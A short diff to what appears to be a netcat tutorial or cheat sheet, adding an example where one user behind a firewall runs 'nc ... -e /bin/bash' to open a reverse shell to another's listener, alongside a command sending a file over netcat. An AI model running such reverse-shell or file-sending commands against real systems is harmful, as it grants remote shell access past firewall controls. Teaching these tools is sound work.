@@ -36,7 +36,16 @@ nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 
 <b>Alice connects to Bob's pc:</b>
 
-(ALICE): nc -nv 10.11.17.9 4444
+(ALICE): nc -nv <[BOB_IP]> 4444
+
+<b>Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:</b>
+
+(ALICE): nc -nv <[BOB_IP]> 4444 -e /bin/bash
+
+<b>Bob connects to Alice's pc:</b>
+
+(BOB): nc -nlvp 4444
+
 
 
 
